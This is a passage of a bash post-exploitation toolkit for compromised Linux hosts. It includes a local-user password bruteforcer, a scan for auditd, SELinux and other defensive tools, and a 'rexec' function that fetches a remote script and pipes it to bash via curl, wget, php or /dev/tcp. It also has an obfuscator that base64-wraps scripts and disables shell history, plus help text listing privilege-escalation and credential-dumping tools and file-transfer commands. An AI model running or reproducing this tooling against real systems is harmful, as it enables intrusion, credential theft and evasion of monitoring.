    if [[ ! -d $2 ]]; then
      echo -e "directory not found: $2"
      exit 1
    fi
    cd "$2" || exit 1
  fi

  header "starting http server on $PORT and dir $(pwd)"

  local rslt=1

  # python3
  if which python3 &> /dev/null; then
    python3 -m http.server $PORT
    rslt=$?
  fi

  # python2.7
  if [ "$rslt" -ne 0 ] && which python2.7 &> /dev/null; then
    python2.7 -m SimpleHTTPServer $PORT
    rslt=$?
  fi

  # php
  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -S 0.0.0.0:$PORT
    rslt=$?
  fi

  # ruby
  if [ "$rslt" -ne 0 ] && which ruby &> /dev/null; then
    ruby -run -ehttpd . -p$PORT
    rslt=$?
  fi

  # nodejs
  if [ "$rslt" -ne 0 ] && which node &> /dev/null; then
    local js='Y29uc3QgaHR0cD1yZXF1aXJlKCJodHRwIiksZnM9cmVxdWlyZSgiZnMiKSxwYXRoPXJlcXVpcmUoInBhdGgiKSxwb3J0PSI8UE9SVD4iLHB1YmxpY0Rpcj0iLiIsc2VydmVyPWh0dHAuY3JlYXRlU2VydmVyKCgoZSx0KT0+e2xldCByPXBhdGguam9pbigiLiIsIi8iPT09ZS51cmw/ImluZGV4Lmh0bWwiOmUudXJsKTtmcy5yZWFkRmlsZShyLCgoZSxuKT0+e2U/IkVOT0VOVCI9PT1lLmNvZGU/KHQud3JpdGVIZWFkKDQwNCx7IkNvbnRlbnQtVHlwZSI6InRleHQvcGxhaW4ifSksdC5lbmQoIjQwNCBOb3QgRm91bmQiKSk6KHQud3JpdGVIZWFkKDUwMCx7IkNvbnRlbnQtVHlwZSI6InRleHQvcGxhaW4ifSksdC5lbmQoIjUwMCBJbnRlcm5hbCBTZXJ2ZXIgRXJyb3I6ICIrZS5tZXNzYWdlKSk6KHQud3JpdGVIZWFkKDIwMCx7IkNvbnRlbnQtRGlzcG9zaXRpb24iOmBhdHRhY2htZW50OyBmaWxlbmFtZT0iJHtwYXRoLmJhc2VuYW1lKHIpfSJgLCJDb250ZW50LUxlbmd0aCI6bi5sZW5ndGh9KSx0LmVuZChuKSl9KSl9KSk7c2VydmVyLmxpc3Rlbihwb3J0LCgoKT0+e2NvbnNvbGUubG9nKGBTZXJ2ZXIgbGlzdGVuaW5nIG9uIHBvcnQgJHtwb3J0fWApfSkpOw=='
    local decoded="$(echo $js | base64 -d)"
    decoded="${decoded/\"<PORT>\"/${PORT}}"
    node -e "$decoded"
    rslt=$?
  fi
}

function script_bruteforce_localuser() {
  if [[ -z "$1" || -z "$2" || ! -f "$2" ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <user> <password list filepath>"
    exit 1
  fi

  local username="$1"
  local passlist="$2"

  header "brutforce local user: ${username}"

  local password
  while read -r password; do
    echo -n '.'
    if echo "${password}" | timeout 0.2 su - "${username}" -c 'whoami' | grep -q "${username}"; then
      echo ""
      echo -e "${YELLOW}SUCCESS User: '${username}'; Password: '${password}'"
      exit 0
    fi
  done < "${passlist}"

  echo -e "No password found"
  exit 1
}

function script_detect_security_tools() {
    header "detect security & defence tools"

    if pgrep auditd; then
      echo -e "- Auditd (security audit logging)"
    fi

    if pgrep ossec; then
      echo -e "- OSSEC (intrusion detection)"
    fi

    if pgrep iptables; then
      echo -e "- iptables (firewall)"
    fi

    if pgrep ufw; then
      echo -e "- ufw (firewall)"
    fi

    if [[ -d /etc/tripwire ]]; then
      echo -e "- Tripwire (file integrity monitoring)"
    fi

    if [[ -d /etc/aide ]]; then
      echo -e "- AIDE (file integrity monitoring)"
    fi

    if [[ -d /etc/apparmor.d ]]; then
      echo -e "- AppArmor (application security profiling)"
    fi

    if [[ -d /etc/chkrootkit ]]; then
      echo -e "- chkrootkit (rootkit scanner)"
    fi

    if [[ -d /etc/selinux ]]; then
      echo -e "- SELinux (mandatory access control enforcement)"
    fi

    if [[ -d /etc/fluent-bit ]]; then
      echo -e "- Fluent Bit (log collection)"
    fi

    if [[ -f /etc/rkhunter.conf ]]; then
      echo -e "- Rootkit Hunter (rootkit scanner)"
    fi
}

function script_start_smb_server() {
    header "TODO starting smb server"
    # TODO
}

function script_start_ftp_server() {
    header "TODO starting ftp server"

}

function script_exec_remote_bash() {
  if [[ "$1" == "-h" || -z $1 ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <SCRIPT_URL>"
    exit 1
  fi

  local URL="$1"
  local HOST="${URL##*://}"
  HOST="${HOST%%/*}"
  local PORT=80
  local URLPATH="/$(echo "$URL" | cut -d'/' -f4-)"

  if [[ "$HOST" == *:* ]]; then
    PORT="${HOST##*:}"
    HOST="${HOST%%:*}"
  fi

  rslt=1

  if [ "$rslt" -ne 0 ] && which curl &> /dev/null; then
    curl -A "$UA" -SsL --insecure $URL | bash
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which wget &> /dev/null; then
    wget --user-agent="$UA" -q -O - $URL | bash
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ] && which php &> /dev/null; then
    php -r "\$lines = @file('${URL}'); foreach (\$lines as \$line_num => \$line) { echo \$line; }" | bash
    rslt=$?
  fi

  if [ "$rslt" -ne 0 ]; then
    exec 3<>/dev/tcp/$HOST/$PORT
    echo -e "GET $URLPATH HTTP/1.1\r\n\r\n">&3
    bash <&3
    rslt=$?
    exec 3>&-
  fi

}

function script_download_file() {
  if [[ "$1" == "-h" || -z $1 ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <[http(s)://|smb://|ftp://|nc://]FILE_URL>"
    exit 1
  fi

  local URL=$1

  if [[ "$1" == https* ]]; then
    action_download_file_https "$1"
  elif [[ "$1" == http* ]]; then
    action_download_file_http "$1"
  elif [[ "$1" == smb* ]]; then
    echo 'TODO smb://'
  elif [[ "$1" == ftp* ]]; then
    echo 'TODO ftp://'
  elif [[ "$1" == nc* ]]; then
    echo 'TODO nc://'
  fi

  # TODO download file by url http(s):// smb:// ftp:// nc://
}

function script_fsmon() {
  if [[ "$1" == "-h" || -z $1 ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <path> [count of files]"
    exit 1
  fi

  action_fsmon "$1" $2
}

function script_obfuscate() {
  if [[ "$1" == "-h" || -z $1 || ! -f $1 ]]; then
    echo -e "usage: $SCRIPT $INNER_SCRIPT <script path> [output script name]"
    exit 1
  fi

  local filepath="$1"
  local outpath="${filepath}.out"
  if [[ -n "$2" ]]; then
    outpath="$2"
  fi

  echo '#!/bin/bash' > "$outpath"
  echo 'export HISTSIZE=0' >> "$outpath"
  echo 'export HISTFILE=/dev/null' >> "$outpath"
  echo -n "echo '" >> "$outpath"
  cat "$filepath" | gzip | base64 -w 0 >> "$outpath"
  echo -n "' | base64 -d | gunzip | bash -s -- \"\$1\" \"\$2\" \"\$3\" \"\$4\" \"\$5\" \"\$6\"" >> "$outpath"
}

function script_help() {
  help

  header "privesc & enum scripts (tip: use ${NC}rexec${YELLOW} script to run from server)"
  tips "linpeas.sh                 https://github.com/peass-ng/PEASS-ng/releases"
  tips "LinEnum.sh                 https://github.com/rebootuser/LinEnum"
  tips "lse.sh                     https://github.com/diego-treitos/linux-smart-enumeration"
  tips "linikatz.sh                https://github.com/CiscoCXSecurity/linikatz"
  tips "mimipenguin.sh             https://github.com/huntergregal/mimipenguin"
  tips "linux-exploit-suggester    https://github.com/The-Z-Labs/linux-exploit-suggester"
  tips "linux-exploit-suggester-2  https://github.com/jondonas/linux-exploit-suggester-2"
  tips "bashark.sh                 https://github.com/redcode-labs/Bashark"
  tips "linuxprivchecker.py        https://github.com/sleventyeleven/linuxprivchecker"
  tips "https://gtfobins.github.io/"
  separator

  header "transfer files"
  echo -e "using openssl"
  echo -e " server:"
  tips "openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem"
  tips "openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh"
  echo -e " client:"
  tips "openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh"
  separator

  header "/proc/<proc id>; use \"cat /proc/<proc id>/cmdline | tr '\000' ' '\""
  tips "/proc/<proc id>/cmdline \t full process command line"
  tips "/proc/<proc id>/cwd     \t process working directory"
  tips "/proc/<proc id>/enwiron \t process environment vars"
  tips "/proc/<proc id>/exe     \t points to the bin that started the process"
  tips "/proc/<proc id>/task    \t subdirs for each thread started the process"
  tips "/proc/<proc id>/status  \t process status"
  tips "/proc/<proc id>/fd      \t file descriptor in use"
  separator

  header "find tips"
  tips "find / -type f -perm -o=rwx \t search rwx files for all"
  tips "find / -type f -perm -u=s   \t search SUID files"
  separator

}

function help() {
    echo -e "usage: ${0} ${YELLOW}<script>${NC} [params]"

    echo -e " ${BLUE}gather info scripts:${NC}"
    echo -e "   ${YELLOW}info${NC}          \t fast - prints users, netstat, search kerberos files, etc..."
    echo -e "   ${YELLOW}files${NC}         \t search db, sql, backup, scripts, config, SUID, GUID files"
    echo -e "   ${YELLOW}passwords${NC}     \t search passwords, ssh keys, api keys, tokens in files (slow)"
    echo -e "   ${YELLOW}logs${NC}          \t search interesting in logs"
    echo -e "   ${YELLOW}searchw${NC}       \t search writable directories & files"
    echo -e "   ${YELLOW}installedsoft${NC} \t list installed packages & soft"

    echo -e "\n ${BLUE}scaner scripts:${NC}"
    echo -e "   ${YELLOW}networkscan${NC} [params]     \t scan internal network(s) for avail hosts"
    echo -e "   ${YELLOW}ncscan${NC} [params]          \t simple TCP ports scanner using nc (preferable)"
    echo -e "   ${YELLOW}bashscan${NC} [params]        \t simple TCP ports scanner using bash"

    echo -e "\n ${BLUE}transfer files scripts:${NC}"
    echo -e "   ${YELLOW}sendf${NC} [params]           \t send file to remote server (http[s], smb, ftp)"
    echo -e "   ${YELLOW}download${NC} [params]        \t download file (http[s], smb, ftp)"

    echo -e "\n ${BLUE}local server scripts:${NC}"
    echo -e "   ${YELLOW}httpserver${NC} [params]      \t start http server"
#    echo -e "   ${YELLOW}ftpserver${NC} [params]      \t start ftp server"
#    echo -e "   ${YELLOW}smbserver${NC} [params]      \t start smb server"

    echo -e "\n ${BLUE}monitor scripts:${NC}"
    echo -e "   ${YELLOW}fsmon${NC} [params]           \t monitoring FS changes"

    echo -e "\n ${BLUE}bruteforce scripts:${NC}"
    echo -e "   ${YELLOW}localuser${NC} [params]       \t bruteforce local user (using bash su -)"

    echo -e "\n ${BLUE}other:${NC}"
    echo -e "   ${YELLOW}rexec${NC} [params]              \t execute remote bash|sh script"
    echo -e "   ${YELLOW}sectooldetect${NC} [params]      \t detect security tools"
    echo -e "   ${YELLOW}obfuscate${NC} [params]          \t obfuscate script"


    echo -e "\n ${BLUE}help or -h: tips${NC}"
}

scripts="info files passwords logs searchw installedsoft networkscan bashscan ncscan sendf httpserver ftpserver smbserver rexec download fsmon obfuscate localuser sectooldetect help -h"
if [[ -z "$1" || ! "$scripts" =~ (^|[[:space:]])"$1"($|[[:space:]]) ]]; then
  help
  exit 1
fi

case "$INNER_SCRIPT" in
  "info") script_info ;;
  "files") script_files ;;
  "searchw") script_search_writable_dirs_files ;;
  "passwords") script_passwords ;;
  "logs") script_logs ;;
  "installedsoft") script_installed_soft ;;
  
  "networkscan") script_scan_local_networks "$2" "$3" "$4" "$5" ;;
  "bashscan") script_ports_scanner "$2" "$3" "$4" "$5" ;;
  "ncscan") script_ports_ncscanner "$2" "$3" "$4" "$5" ;;

  "sendf") script_sendfile "$2" "$3" ;;
  "httpserver") script_start_httpserver "$2" "$3" ;;
  "ftpserver") script_start_ftp_server "$2" ;;
  "smbserver") script_start_smb_server "$2" ;;
  "rexec") script_exec_remote_bash "$2" ;;
  "download") script_download_file "$2" ;;
  "fsmon") script_fsmon "$2" "$3" ;;

  "localuser") script_bruteforce_localuser "$2" "$3" ;;

  "sectooldetect") script_detect_security_tools ;;
  "obfuscate") script_obfuscate "$2" "$3" ;;
  "-h"|"help") script_help ;;
  *) help; exit 1 ;;
esac

# ======================================================================================================================
